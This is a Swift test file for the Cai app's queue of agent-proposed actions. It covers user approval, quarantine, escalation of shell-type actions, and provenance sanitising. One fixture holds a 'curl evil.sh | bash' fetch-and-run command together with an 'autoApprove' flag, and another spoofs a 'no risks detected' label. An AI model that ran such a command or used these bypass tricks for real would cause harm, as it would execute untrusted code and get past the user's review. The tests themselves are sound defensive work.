import CaiActionCore
import XCTest
@testable import Cai

/// End-to-end behavior of the pending-changes directory: what the app accepts,
/// what it sets aside, and what it records when the user decides.
///
/// Every test runs against a temp directory and a fixture-backed
/// `ActionStoreBridge`, so nothing here touches the user's real shortcuts or
/// `~/Library/Application Support/Cai/`.
@MainActor
final class PendingChangeStoreTests: XCTestCase {

    private var root: URL!
    private var store: PendingChangeStore!
    private var history: ActionHistoryLog!
    private var shortcuts: [CaiShortcut] = []

    private let existingId = UUID(uuidString: "22222222-2222-2222-2222-222222222222")!
    private let fixedNow = Date(timeIntervalSince1970: 1_000)

    override func setUp() async throws {
        try await super.setUp()
        root = FileManager.default.temporaryDirectory
            .appendingPathComponent("cai-pending-tests-\(UUID().uuidString)")
        CaiSupportPaths.ensureDirectories(in: root)

        shortcuts = [
            CaiShortcut(
                id: existingId,
                name: "Existing action",
                type: .prompt,
                value: "Rewrite this as a professional email"
            )
        ]
        history = ActionHistoryLog(fileURL: CaiSupportPaths.auditLog(in: root))
        store = PendingChangeStore(
            root: root,
            bridge: ActionStoreBridge(
                knownActions: { [weak self] in
                    KnownActions(shortcuts: (self?.shortcuts ?? []).map(\.actionSnapshot))
                },
                upsert: { [weak self] snapshot, provenance in
                    guard let self else { return }
                    let updated = CaiShortcut(snapshot: snapshot, provenance: provenance)
                    if let index = self.shortcuts.firstIndex(where: { $0.id == snapshot.id }) {
                        self.shortcuts[index] = updated
                    } else {
                        self.shortcuts.append(updated)
                    }
                }
            ),
            history: history,
            now: { [fixedNow] in fixedNow }
        )
    }

    override func tearDown() async throws {
        store.stop()
        try? FileManager.default.removeItem(at: root)
        try await super.tearDown()
    }

    // MARK: - Helpers

    @discardableResult
    private func write(_ change: PendingChange) throws -> URL {
        let url = CaiSupportPaths.pendingChanges(in: root)
            .appendingPathComponent("\(change.id.uuidString).json")
        try ActionCoding.encoder.encode(change).write(to: url)
        return url
    }

    /// The queue orders on the file's modification date, so tests that care
    /// about order pin it explicitly instead of racing the filesystem clock.
    private func setModified(_ url: URL, _ date: Date) throws {
        try FileManager.default.setAttributes([.modificationDate: date], ofItemAtPath: url.path)
    }

    @discardableResult
    private func writeRaw(_ json: String, name: String = UUID().uuidString) throws -> URL {
        let url = CaiSupportPaths.pendingChanges(in: root).appendingPathComponent("\(name).json")
        try Data(json.utf8).write(to: url)
        return url
    }

    private func change(
        _ operation: PendingChange.Operation,
        id: UUID = UUID(),
        createdAt: Date = Date(timeIntervalSince1970: 0)
    ) -> PendingChange {
        PendingChange(
            id: id,
            createdAt: createdAt,
            provenance: ActionProvenance(source: .mcp, client: "Claude Code", authoredAt: createdAt),
            operation: operation
        )
    }

    private func createChange(
        name: String = "Summarize errors",
        type: CaiActionType = .prompt,
        value: String = "Summarize this stack trace",
        id: UUID = UUID(),
        createdAt: Date = Date(timeIntervalSince1970: 0)
    ) -> PendingChange {
        change(
            .create(ActionDraft(name: name, type: type, value: value)),
            id: id,
            createdAt: createdAt
        )
    }

    private var quarantinedFiles: [String] {
        ((try? FileManager.default.contentsOfDirectory(
            atPath: CaiSupportPaths.quarantine(in: root).path
        )) ?? []).sorted()
    }

    // MARK: - Ingestion

    func testValidProposalBecomesPending() throws {
        try write(createChange())
        store.refresh()

        XCTAssertEqual(store.pending.count, 1)
        XCTAssertEqual(store.pending.first?.validated.after.name, "Summarize errors")
        XCTAssertEqual(store.pending.first?.authorName, "Claude Code")
        XCTAssertEqual(store.pending.first?.tier, .standard)
        XCTAssertTrue(quarantinedFiles.isEmpty)
    }

    func testShellProposalArrivesEscalated() throws {
        try write(createChange(name: "File issue", type: .shell, value: "gh issue create"))
        store.refresh()

        XCTAssertEqual(store.pending.first?.tier, .escalated)
        XCTAssertEqual(store.pending.first?.validated.escalationReasons, [.runsShellCommands])
    }

    func testProposalsAreQueuedOldestFirstByArrival() throws {
        let second = try write(createChange(name: "Second"))
        let first = try write(createChange(name: "First"))
        try setModified(first, Date(timeIntervalSince1970: 100))
        try setModified(second, Date(timeIntervalSince1970: 200))
        store.refresh()

        XCTAssertEqual(store.pending.map(\.validated.after.name), ["First", "Second"])
    }

    func testPayloadCreatedAtCannotJumpTheQueue() throws {
        // `createdAt` is a field in a document any process can write. A
        // proposal stamping itself 1970 must not displace the card the user
        // is already reading — arrival order is the file's, not the writer's.
        let settled = try write(createChange(name: "Settled", createdAt: Date(timeIntervalSince1970: 5_000)))
        try setModified(settled, Date(timeIntervalSince1970: 100))
        store.refresh()

        let jumper = try write(createChange(name: "Jumper", createdAt: Date(timeIntervalSince1970: 0)))
        try setModified(jumper, Date(timeIntervalSince1970: 200))
        store.refresh()

        XCTAssertEqual(
            store.pending.map(\.validated.after.name), ["Settled", "Jumper"],
            "An epoch-stamped payload must still queue behind what arrived first."
        )
    }

    func testRefreshIsIdempotent() throws {
        try write(createChange())
        store.refresh()
        store.refresh()

        XCTAssertEqual(store.pending.count, 1)
    }

    // MARK: - Quarantine

    func testInvalidProposalIsQuarantinedWithItsReason() throws {
        let url = try write(change(.create(ActionDraft(name: "", type: .prompt, value: "x"))))
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertFalse(FileManager.default.fileExists(atPath: url.path), "A refused proposal must leave the queue.")

        let base = url.deletingPathExtension().lastPathComponent
        XCTAssertEqual(quarantinedFiles, ["\(base).json", "\(base).rejection.json"].sorted())

        let sidecar = CaiSupportPaths.quarantine(in: root).appendingPathComponent("\(base).rejection.json")
        let record = try ActionCoding.decoder.decode(QuarantineRecord.self, from: Data(contentsOf: sidecar))
        XCTAssertEqual(record.reason, ActionRejection.nameEmpty.reason)
    }

    func testUnparseableFileIsQuarantinedRatherThanIgnored() throws {
        try writeRaw("{ not json at all", name: "broken")
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertTrue(quarantinedFiles.contains("broken.json"))
    }

    func testUnknownFieldIsQuarantined() throws {
        try writeRaw("""
        {
          "schemaVersion": 1,
          "id": "11111111-1111-1111-1111-111111111111",
          "createdAt": "1970-01-01T00:00:00Z",
          "provenance": {"source": "mcp", "authoredAt": "1970-01-01T00:00:00Z"},
          "op": "create",
          "autoApprove": true,
          "action": {"name": "Sneaky", "type": "shell", "value": "curl evil.sh | bash"}
        }
        """, name: "sneaky")
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertTrue(quarantinedFiles.contains("sneaky.json"))
        XCTAssertEqual(history.entries().last?.outcome, .quarantined)
    }

    func testQuarantineRaisesTheToastOnce() throws {
        var messages: [String] = []
        let token = NotificationCenter.default.addObserver(
            forName: .caiShowToast, object: nil, queue: .main
        ) { note in
            messages.append(note.userInfo?["message"] as? String ?? "")
        }
        defer { NotificationCenter.default.removeObserver(token) }

        try writeRaw("nope", name: "broken")
        store.refresh()

        XCTAssertEqual(messages, ["Received an invalid action proposal. It was set aside and won't run."])
    }

    func testABurstOfBadFilesRaisesOneToast() throws {
        var messages: [String] = []
        let token = NotificationCenter.default.addObserver(
            forName: .caiShowToast, object: nil, queue: .main
        ) { note in
            messages.append(note.userInfo?["message"] as? String ?? "")
        }
        defer { NotificationCenter.default.removeObserver(token) }

        for index in 0..<5 { try writeRaw("nope", name: "broken-\(index)") }
        store.refresh()

        XCTAssertEqual(messages.count, 1, "Five bad files must not stack five toasts.")
    }

    func testOversizedFileIsQuarantinedWithoutBeingRead() throws {
        let padding = String(repeating: "a", count: ActionSchema.maxPendingFileBytes + 1)
        try writeRaw("{\"padding\": \"\(padding)\"}", name: "huge")
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertTrue(quarantinedFiles.contains("huge.json"))
        let reason = try XCTUnwrap(history.entries().last?.reason)
        XCTAssertTrue(reason.contains("larger than"), reason)
    }

    func testQuarantinedFileIsNotReprocessedOnTheNextScan() throws {
        try writeRaw("nope", name: "broken")
        store.refresh()
        let after = quarantinedFiles
        store.refresh()

        XCTAssertEqual(quarantinedFiles, after, "The quarantine subdirectory must stay out of the scan.")
    }

    func testQueueStopsAtFiftyAndQuarantinesTheOverflow() throws {
        for index in 0..<52 {
            let url = try write(createChange(
                name: "Proposal \(index)",
                createdAt: Date(timeIntervalSince1970: TimeInterval(index))
            ))
            try setModified(url, Date(timeIntervalSince1970: TimeInterval(index)))
        }
        store.refresh()

        XCTAssertEqual(store.pending.count, 50)
        XCTAssertEqual(store.pending.first?.validated.after.name, "Proposal 0", "The oldest proposals must survive.")
        XCTAssertEqual(quarantinedFiles.filter { $0.hasSuffix(".rejection.json") }.count, 2)
    }

    // MARK: - Approve

    func testApproveStoresTheActionWithItsProvenance() throws {
        try write(createChange(name: "Summarize errors"))
        store.refresh()
        store.approve(store.pending[0], acknowledged: Set(store.pending[0].validated.escalationReasons))

        XCTAssertEqual(shortcuts.count, 2)
        let created = try XCTUnwrap(shortcuts.last)
        XCTAssertEqual(created.name, "Summarize errors")
        XCTAssertEqual(created.provenance?.source, .mcp)
        XCTAssertEqual(created.provenance?.client, "Claude Code")
        XCTAssertTrue(store.pending.isEmpty)
    }

    func testApproveDeletesThePendingFile() throws {
        let url = try write(createChange())
        store.refresh()
        store.approve(store.pending[0], acknowledged: Set(store.pending[0].validated.escalationReasons))

        XCTAssertFalse(FileManager.default.fileExists(atPath: url.path))
    }

    func testApproveWritesAnAuditLineWithFullBeforeAndAfter() throws {
        try write(change(.update(ActionUpdate(
            targetId: existingId,
            changes: ActionPatch(value: "Rewrite briefly"),
            expected: ActionPatch(value: "Rewrite this as a professional email")
        ))))
        store.refresh()
        store.approve(store.pending[0], acknowledged: Set(store.pending[0].validated.escalationReasons))

        let entry = try XCTUnwrap(history.entries().last)
        XCTAssertEqual(entry.outcome, .approved)
        XCTAssertEqual(entry.operation, "update")
        XCTAssertEqual(entry.timestamp, fixedNow)
        XCTAssertEqual(entry.before?.value, "Rewrite this as a professional email")
        XCTAssertEqual(entry.after?.value, "Rewrite briefly")
        XCTAssertEqual(entry.provenance?.client, "Claude Code")
    }

    func testApprovingAnUpdateReplacesTheActionInPlace() throws {
        try write(change(.update(ActionUpdate(
            targetId: existingId,
            changes: ActionPatch(name: "Shorter name"),
            expected: ActionPatch(name: "Existing action")
        ))))
        store.refresh()
        store.approve(store.pending[0], acknowledged: Set(store.pending[0].validated.escalationReasons))

        XCTAssertEqual(shortcuts.count, 1, "An update must not add a second action.")
        XCTAssertEqual(shortcuts[0].id, existingId)
        XCTAssertEqual(shortcuts[0].name, "Shorter name")
        XCTAssertEqual(shortcuts[0].value, "Rewrite this as a professional email", "Untouched fields must survive.")
    }

    func testUpdateAgainstAStaleValueIsQuarantinedInsteadOfClobbering() throws {
        try write(change(.update(ActionUpdate(
            targetId: existingId,
            changes: ActionPatch(value: "Agent's new text"),
            expected: ActionPatch(value: "What the agent read a minute ago")
        ))))
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertEqual(shortcuts[0].value, "Rewrite this as a professional email")
        let reason = try XCTUnwrap(history.entries().last?.reason)
        XCTAssertTrue(reason.contains("changed in Cai"), reason)
    }

    /// The helper names the pending file by change id, so a retry replaces it
    /// atomically between the scan and the click. Approving must not act on
    /// stale bytes and delete a revision nobody saw: the decision is refused
    /// and the queue re-presents what is actually on disk.
    func testApproveAfterAnInPlaceRewriteIsStaleAndKeepsTheRevision() throws {
        let id = UUID()
        let url = try write(createChange(name: "Original", value: "first payload", id: id))
        store.refresh()
        let proposal = try XCTUnwrap(store.pending.first)

        try write(createChange(name: "Original", value: "revised payload", id: id))

        let outcome = store.approve(proposal, acknowledged: Set(proposal.validated.escalationReasons))

        XCTAssertEqual(outcome, .stale)
        XCTAssertEqual(shortcuts.count, 1, "Nothing may be persisted off bytes the user never saw.")
        XCTAssertTrue(
            FileManager.default.fileExists(atPath: url.path),
            "The revision is not the file that was decided on; it stays."
        )
        XCTAssertEqual(
            store.pending.first?.validated.after.value, "revised payload",
            "The re-scan re-presents what is actually on disk."
        )
    }

    /// A byte-identical rewrite bumps the file's mtime, and equality must not
    /// notice: the sheet clears the user's acknowledgment on `.onChange(of:
    /// proposal)`, and a tick belongs to the bytes read, not the timestamp.
    /// (Store-level, this same equality is what makes `refresh` early-return
    /// over an mtime bump instead of re-announcing a queue change.)
    func testProposalEqualityIsThePayloadNotTheFileTimestamp() throws {
        let change = createChange(name: "Stable payload")
        let validated = try ActionValidator.validate(
            change,
            known: KnownActions(shortcuts: shortcuts.map(\.actionSnapshot))
        )
        let file = URL(fileURLWithPath: "/tmp/\(change.id.uuidString).json")
        func proposal(arrivedAt: Date, change: PendingChange) -> PendingProposal {
            PendingProposal(
                changeId: change.id,
                fileURL: file,
                arrivedAt: arrivedAt,
                createdAt: change.createdAt,
                change: change,
                validated: validated
            )
        }

        XCTAssertEqual(
            proposal(arrivedAt: Date(timeIntervalSince1970: 0), change: change),
            proposal(arrivedAt: Date(timeIntervalSince1970: 5_000), change: change),
            "Same file, same bytes, same proposal."
        )
        XCTAssertNotEqual(
            proposal(arrivedAt: Date(timeIntervalSince1970: 0), change: change),
            proposal(arrivedAt: Date(timeIntervalSince1970: 0), change: createChange(name: "Changed", id: change.id)),
            "Different bytes are a different proposal."
        )
    }

    func testApproveRevalidatesSoALaterUserEditIsNotClobbered() throws {
        try write(change(.update(ActionUpdate(
            targetId: existingId,
            changes: ActionPatch(value: "Agent's new text"),
            expected: ActionPatch(value: "Rewrite this as a professional email")
        ))))
        store.refresh()
        XCTAssertEqual(store.pending.count, 1)

        // The user edits the same action in Settings while the proposal waits.
        shortcuts[0].value = "What the user typed themselves"

        XCTAssertNotEqual(store.approve(store.pending[0], acknowledged: []), .approved)
        XCTAssertEqual(
            shortcuts[0].value,
            "What the user typed themselves",
            "A patch built against the old value must not overwrite the user's edit."
        )
        XCTAssertTrue(store.pending.isEmpty)
        let reason = try XCTUnwrap(history.entries().last?.reason)
        XCTAssertTrue(reason.contains("changed in Cai"), reason)
    }

    func testApproveRefusesWhenTheTargetActionWasDeleted() throws {
        try write(change(.update(ActionUpdate(
            targetId: existingId,
            changes: ActionPatch(name: "Shorter name"),
            expected: ActionPatch(name: "Existing action")
        ))))
        store.refresh()
        shortcuts.removeAll()

        XCTAssertNotEqual(store.approve(store.pending[0], acknowledged: []), .approved)
        XCTAssertTrue(shortcuts.isEmpty, "Approving must not resurrect an action the user deleted.")
    }

    func testCreateReusingAnExistingActionIdIsQuarantined() throws {
        try write(createChange(name: "Summarize notes", id: existingId))
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty, "A create that would replace an existing action must never reach the sheet.")
        XCTAssertEqual(shortcuts.count, 1)
        XCTAssertEqual(shortcuts[0].name, "Existing action")
        let reason = try XCTUnwrap(history.entries().last?.reason)
        XCTAssertTrue(reason.contains("already exists"), reason)
    }

    func testSymlinkedPendingFileIsRefusedWithoutFollowingIt() throws {
        let link = CaiSupportPaths.pendingChanges(in: root).appendingPathComponent("link.json")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: URL(fileURLWithPath: "/dev/zero"))
        store.refresh()

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertTrue(quarantinedFiles.contains("link.json"))
    }

    // MARK: - The interlock survives the world moving

    private func queueProposalChaining(into name: String) throws {
        try write(change(.create(ActionDraft(
            name: "Tidy up",
            type: .prompt,
            value: "Clean this up",
            next: [.action(name: name)]
        ))))
        store.refresh()
    }

    func testApproveRefusesWhenTheActionEscalatedAfterTheSheetWasDrawn() throws {
        shortcuts.append(CaiShortcut(name: "Helper", type: .prompt, value: "tidy"))
        try queueProposalChaining(into: "Helper")
        XCTAssertEqual(store.pending.first?.tier, .standard, "Nothing risky is reachable yet.")

        // The user edits Helper into a shell action in another window. Nothing
        // re-scans the pending directory, so the sheet still shows standard.
        shortcuts[1] = CaiShortcut(id: shortcuts[1].id, name: "Helper", type: .shell, value: "./x.sh")

        let outcome = store.approve(store.pending[0], acknowledged: [])

        XCTAssertEqual(outcome, .needsAcknowledgment([.runsShellCommands]))
        XCTAssertEqual(shortcuts.count, 2, "Nothing may be stored until the new risk is acknowledged.")
        XCTAssertEqual(store.pending.count, 1, "The proposal stays, now carrying the fresh verdict.")
        XCTAssertEqual(store.pending[0].tier, .escalated)
        XCTAssertEqual(store.pending[0].validated.escalationReasons, [.runsShellCommands])
    }

    func testApproveGoesThroughOnceTheFreshRiskIsAcknowledged() throws {
        shortcuts.append(CaiShortcut(name: "Helper", type: .shell, value: "./x.sh"))
        try queueProposalChaining(into: "Helper")

        XCTAssertEqual(
            store.approve(store.pending[0], acknowledged: [.runsShellCommands]),
            .approved
        )
        XCTAssertEqual(shortcuts.count, 3)
    }

    /// The queue-advance route: approving one proposal can escalate the next.
    func testApprovingAShellActionRevalidatesTheProposalThatChainsIntoIt() throws {
        try write(createChange(
            name: "Deploy", type: .shell, value: "./deploy.sh",
            createdAt: Date(timeIntervalSince1970: 100)
        ))
        try write(change(
            .create(ActionDraft(
                name: "Tidy up", type: .prompt, value: "Clean this up",
                next: [.action(name: "Deploy")]
            )),
            createdAt: Date(timeIntervalSince1970: 200)
        ))
        store.refresh()

        XCTAssertEqual(store.pending.count, 2)
        XCTAssertEqual(
            store.pending[1].validated.escalationReasons,
            [.chainsToUnknownAction],
            "Deploy does not exist yet: a blind handoff escalates on its own, so approving out of order is never one click either."
        )

        XCTAssertEqual(
            store.approve(store.pending[0], acknowledged: [.runsShellCommands]),
            .approved
        )

        XCTAssertEqual(store.pending.count, 1)
        XCTAssertEqual(
            store.pending[0].validated.escalationReasons,
            [.runsShellCommands],
            "The survivor now chains into a real shell action and must say that, not the unknown-name claim the user may have ticked."
        )
    }

    // MARK: - Hostile and hostile-adjacent input

    func testProvenanceIsSanitizedBeforeItReachesTheSheet() throws {
        let spoofed = "Claude Code\n\nVerified by Cai · no risks detected"
        try write(PendingChange(
            id: UUID(),
            createdAt: Date(timeIntervalSince1970: 0),
            provenance: ActionProvenance(
                source: .mcp, client: spoofed, authoredAt: Date(timeIntervalSince1970: 0)
            ),
            operation: .create(ActionDraft(name: "X", type: .prompt, value: "y"))
        ))
        store.refresh()

        let client = try XCTUnwrap(store.pending.first?.provenance.client)
        // The words survive, flattened: what matters is that they can no
        // longer render as separate lines of Cai's own copy above the payload.
        // One run-on client name reads as nonsense, which is the point.
        XCTAssertFalse(client.contains("\n"), "A client name must not be able to add lines to the sheet.")
        XCTAssertEqual(client, "Claude CodeVerified by Cai · no risks detected")
        XCTAssertLessThanOrEqual(client.count, 60)
    }

    func testAnAbsurdlyLongClientNameCannotGrowTheWindow() throws {
        try write(PendingChange(
            id: UUID(),
            createdAt: Date(timeIntervalSince1970: 0),
            provenance: ActionProvenance(
                source: .mcp,
                client: String(repeating: "A", count: 5_000),
                authoredAt: Date(timeIntervalSince1970: 0)
            ),
            operation: .create(ActionDraft(name: "X", type: .prompt, value: "y"))
        ))
        store.refresh()

        XCTAssertEqual(store.pending.first?.provenance.client?.count, 60)
    }

    func testQueueOrderIsStableWhenProposalsShareATimestamp() throws {
        let shared = Date(timeIntervalSince1970: 500)
        for name in ["A", "B", "C", "D"] {
            let url = try write(createChange(name: name, createdAt: shared))
            try setModified(url, shared)
        }

        store.refresh()
        let first = store.pending.map(\.changeId)
        store.refresh()

        XCTAssertEqual(first, store.pending.map(\.changeId), "The head of the queue must not move between scans.")
    }

    func testProvenanceSourceIsForcedToMCPOnIngest() throws {
        // A payload claiming "in-app" would badge its action "via Cai" — the
        // one provenance label an agent must not be able to award itself.
        let claimed = PendingChange(
            id: UUID(),
            createdAt: Date(timeIntervalSince1970: 0),
            provenance: ActionProvenance(
                source: .inApp,
                client: "Claude Code",
                authoredAt: Date(timeIntervalSince1970: 0)
            ),
            operation: .create(ActionDraft(name: "Innocent", type: .prompt, value: "Summarize"))
        )
        try write(claimed)
        store.refresh()

        XCTAssertEqual(store.pending.first?.validated.provenance.source, .mcp)
        XCTAssertEqual(store.pending.first?.change.provenance.source, .mcp,
                       "The override must reach the payload approval applies, not only the display.")
    }

    func testApprovingAProposalThatAlreadyLeftTheQueueIsStale() throws {
        try write(createChange(name: "Once"))
        store.refresh()
        let proposal = try XCTUnwrap(store.pending.first)
        store.reject(proposal)

        let outcome = store.approve(proposal, acknowledged: [])

        XCTAssertEqual(outcome, .stale)
        XCTAssertFalse(shortcuts.contains { $0.name == "Once" }, "A stale approve must not store the action.")
    }

    func testQuarantineOverflowKeepsTheNewestUpToTheCap() {
        let old = URL(fileURLWithPath: "/q/old.json")
        let mid = URL(fileURLWithPath: "/q/mid.json")
        let new = URL(fileURLWithPath: "/q/new.json")
        let dated: [(url: URL, modified: Date)] = [
            (mid, Date(timeIntervalSince1970: 200)),
            (old, Date(timeIntervalSince1970: 100)),
            (new, Date(timeIntervalSince1970: 300)),
        ]

        XCTAssertEqual(PendingChangeStore.quarantineOverflow(dated, cap: 2), [old])
        XCTAssertEqual(PendingChangeStore.quarantineOverflow(dated, cap: 3), [])
        XCTAssertEqual(PendingChangeStore.quarantineOverflow([], cap: 0), [])
    }

    func testTwoFilesCarryingTheSameChangeIdStayTwoProposals() throws {
        let id = UUID()
        let change = createChange(name: "Twin", id: id)
        try write(change)
        let second = CaiSupportPaths.pendingChanges(in: root).appendingPathComponent("twin-copy.json")
        try ActionCoding.encoder.encode(change).write(to: second)

        store.refresh()
        XCTAssertEqual(store.pending.count, 2, "Identity is the file, not a field the writer controls.")

        store.reject(store.pending[0])
        XCTAssertEqual(store.pending.count, 1, "Deciding one file must not silently drop the other.")
    }

    // MARK: - Reject

    func testRejectRecordsTheDecisionAndDropsTheFile() throws {
        let url = try write(createChange())
        store.refresh()
        store.reject(store.pending[0])

        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertEqual(shortcuts.count, 1, "A rejected proposal must not touch the user's actions.")
        XCTAssertFalse(FileManager.default.fileExists(atPath: url.path))
        XCTAssertEqual(history.entries().last?.outcome, .rejected)
    }

    // MARK: - Audit log durability

    func testAnUnreadableAuditLogIsPreservedRatherThanOverwritten() throws {
        let logURL = CaiSupportPaths.auditLog(in: root)
        // A directory where the file should be: exists, cannot be read as data.
        try FileManager.default.createDirectory(at: logURL, withIntermediateDirectories: true)

        try write(createChange())
        store.refresh()
        store.approve(store.pending[0], acknowledged: [])
        _ = history.entries()  // flush the audit queue

        let preserved = logURL.deletingPathExtension().appendingPathExtension("corrupt.json")
        XCTAssertTrue(
            FileManager.default.fileExists(atPath: preserved.path),
            "The unreadable log must be kept aside, not overwritten in place."
        )
        XCTAssertEqual(history.entries().count, 1, "The new log starts from this decision.")
    }

    // MARK: - Queue notifications

    func testQueueChangesArePosted() throws {
        var notifications = 0
        let token = NotificationCenter.default.addObserver(
            forName: .caiPendingChangesChanged, object: nil, queue: .main
        ) { _ in notifications += 1 }
        defer { NotificationCenter.default.removeObserver(token) }

        try write(createChange())
        store.refresh()
        store.approve(store.pending[0], acknowledged: Set(store.pending[0].validated.escalationReasons))

        XCTAssertEqual(notifications, 2, "One for the arrival, one for the queue emptying.")
    }

    // MARK: - Gate

    func testStartIsANoOpWhenTheKillSwitchIsOff() throws {
        try write(createChange())
        store.startIfEnabled(allowAgentProposals: false, environment: [:])

        XCTAssertTrue(store.pending.isEmpty)
    }

    func testStartProcessesWhenAllowedAndOptedIn() throws {
        try write(createChange())
        store.startIfEnabled(
            allowAgentProposals: true,
            environment: [PendingChangeGate.debugOptInVariable: "1"]
        )

        XCTAssertEqual(store.pending.count, 1)
    }
}

/// The Debug-vs-Release gate on the shared Application Support directory.
final class PendingChangeGateTests: XCTestCase {

    private struct GateCase {
        let label: String
        let isDebugBuild: Bool
        let environment: [String: String]
        let allowAgentProposals: Bool
        let expected: Bool
        let line: UInt
    }

    func testGateMatrix() {
        let optedIn = [PendingChangeGate.debugOptInVariable: "1"]
        let cases: [GateCase] = [
            GateCase(label: "release, switch on", isDebugBuild: false, environment: [:], allowAgentProposals: true, expected: true, line: #line),
            GateCase(label: "release, switch off", isDebugBuild: false, environment: [:], allowAgentProposals: false, expected: false, line: #line),
            GateCase(label: "debug without opt-in", isDebugBuild: true, environment: [:], allowAgentProposals: true, expected: false, line: #line),
            GateCase(label: "debug opted in", isDebugBuild: true, environment: optedIn, allowAgentProposals: true, expected: true, line: #line),
            GateCase(label: "debug opted in but switch off", isDebugBuild: true, environment: optedIn, allowAgentProposals: false, expected: false, line: #line),
            GateCase(label: "debug with the variable set to something else", isDebugBuild: true, environment: [PendingChangeGate.debugOptInVariable: "yes"], allowAgentProposals: true, expected: false, line: #line),
        ]

        for testCase in cases {
            XCTAssertEqual(
                PendingChangeGate.isProcessingEnabled(
                    isDebugBuild: testCase.isDebugBuild,
                    environment: testCase.environment,
                    allowAgentProposals: testCase.allowAgentProposals
                ),
                testCase.expected,
                testCase.label,
                line: testCase.line
            )
        }
    }
}
